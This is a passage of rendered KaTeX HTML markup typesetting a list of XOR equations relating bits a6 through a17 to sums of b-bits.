style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-16.650000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-15.210000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-13.770000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-12.330000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-10.890000000000013em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-9.450000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-8.010000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-6.570000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.130000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.690000000000019em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.2500000000000213em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.8100000000000237em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 